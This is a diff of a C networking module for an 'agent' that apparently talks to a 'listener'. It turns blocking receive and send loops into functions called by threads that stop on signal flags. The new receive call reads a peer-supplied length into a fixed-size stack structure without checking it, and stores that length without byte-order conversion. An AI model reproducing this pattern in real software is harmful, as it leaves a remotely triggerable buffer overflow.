@@ -3,6 +3,8 @@
 #include <unistd.h>
 #include <string.h>
 #include <pthread.h>
+#include <signal.h>
+#include <stdbool.h>
 
 #include <sys/socket.h>
 #include <arpa/inet.h>
@@ -19,70 +21,88 @@ extern pthread_mutex_t agent_receive_queue_lock;
 // Send Queue
 extern struct Queue* agent_send_queue;
 extern pthread_mutex_t agent_send_queue_lock;
+// Alarm flag
+extern volatile sig_atomic_t agent_alive_flag;
+// SIGINT flags
+extern volatile sig_atomic_t agent_close_flag;
 
-void *agent_receive(void *vargp){
-	int *sockfd = (int*)vargp;
+STATIC int agent_receive(int *sockfd, int *next_read_size){
 	Fragment fragment;
 	
-	for (;;){		
-		// get first chunk which contains total message size
-		printf("size of fragment: %d\n", sizeof(Fragment));
-		int nbytes = recv(*sockfd, (void*)&fragment, FRAGMENT_SIZE, 0);
-		printf("Nbytes: %d\n", nbytes);
-		if (nbytes <= 0){
-			if (nbytes == 0){
-				debug_print("%s\n", "connection closed");
-				exit(RET_OK);
-			}
-			else {
-				printf("recv error\n");
-				exit(RET_ERROR); 
-			}
+	// get first chunk which contains total message size
+	int nbytes = recv(*sockfd, (void*)&fragment, HEADER_SIZE + *next_read_size, 0);
+	if (nbytes <= 0){
+		if (nbytes == 0){
+			debug_print("%s\n", "connection closed");
+			// this is not an error, but we need to close down. 
+			// TODO put a new return value that restarts connection to listener.
+			return RET_ERROR;
 		}
-		
-		if (ntohl(fragment.index) == 0){
-			debug_print("received fragment 0: type: %d, index: %d, size: %d, payload: %s\n", ntohl(fragment.type), ntohl(fragment.index), nbytes, fragment.first_payload.actual_payload);
+		else {
+			printf("recv error\n");
+			return RET_ERROR;
 		}
-		else{
-			debug_print("received fragment n: type: %d, index: %d, size: %d, payload: %s\n", ntohl(fragment.type), ntohl(fragment.index), nbytes, fragment.next_payload);
-		}
-		
-		Queue_Message* message = malloc(sizeof(message));
-		message->fragment = malloc(nbytes + 1);
-		message->id = -1;
-		message->size = nbytes;
-		memset(message->fragment, 0, nbytes + 1);
-		memcpy(message->fragment, &fragment, nbytes);
-		
-		enqueue(agent_receive_queue, &agent_receive_queue_lock, message);
 	}
-	return 0;	
-}
-
-void *agent_send(void *vargp){
-	int *sockfd = (int*)vargp;
-	Queue_Message* message;
 	
-	for(;;){
-		if (!(message = dequeue(agent_send_queue, &agent_send_queue_lock))) continue;
-		
-		if (ntohl(message->fragment->index) == 0){
-			debug_print("sending fragment: type: %d, index: %d, size: %d\n", ntohl(message->fragment->type), ntohl(message->fragment->index), ntohl(message->fragment->first_payload.total_size));
-		}
-		else{
-			debug_print("sending fragment: type: %d, index: %d\n", ntohl(message->fragment->type), ntohl(message->fragment->index));
-		}
-		
-		int nbytes = send(*sockfd, message->fragment, message->size, 0);
-		if (nbytes != message->size){
-			printf("Send error\n");
-			exit(-1);
-		}
-		
-		free(message->fragment);
-		free(message);
-	}
+	debug_print("received fragment: type: %d, index: %d, total_size: %d, next_size: %d\n", \
+		ntohl(fragment.header.type), \
+		ntohl(fragment.header.index), \
+		ntohl(fragment.header.total_size), \
+		ntohl(fragment.header.next_size));
+
+	*next_read_size = fragment.header.next_size;
+
+	Queue_Message* message = malloc(sizeof(Queue_Message));
+	message->fragment = calloc(1, nbytes + 1);
+	message->id = -1;
+	message->size = nbytes;
+	memcpy(message->fragment, &fragment, nbytes);
+	
+	enqueue(agent_receive_queue, &agent_receive_queue_lock, message);
+
 	return 0;	
 }
 
+int agent_send(int *sockfd){
+	Queue_Message* message;
 
+	if (!(message = dequeue(agent_send_queue, &agent_send_queue_lock))) return RET_OK;
+	
+	debug_print("sending fragment: type: %d, index: %d, size: %d\n", ntohl(message->fragment->type), ntohl(message->fragment->index), ntohl(message->fragment->first_payload.total_size));
+	
+	if (sendall(*sockfd, message->fragment, message->size) == RET_ERROR){
+		printf("Send error\n");
+		return RET_ERROR;
+	}
+	
+	free(message->fragment);
+	free(message);
+
+	return 0;	
+}
+
+void *agent_receive_thread(void *vargp){
+	int *sockfd = (int*)vargp;
+	int next_read_size = 0;
+
+	while(!agent_close_flag){
+		if (agent_receive(sockfd, &next_read_size) != RET_OK){
+			agent_close_flag = true;
+		}
+	}
+	debug_print("%s\n", "listener_receive_thread done");
+	return 0;
+}
+
+void *agent_send_thread(void *vargp){
+	int *sockfd = (int*)vargp;
+
+	while(!agent_close_flag){
+		if (agent_send(sockfd) != RET_OK){
+			agent_close_flag = true;
+			printf("listener_send_thread error\n");
+		}
+	}
+	debug_print("%s\n", "listener_send_thread done");
+	return 0;
+}
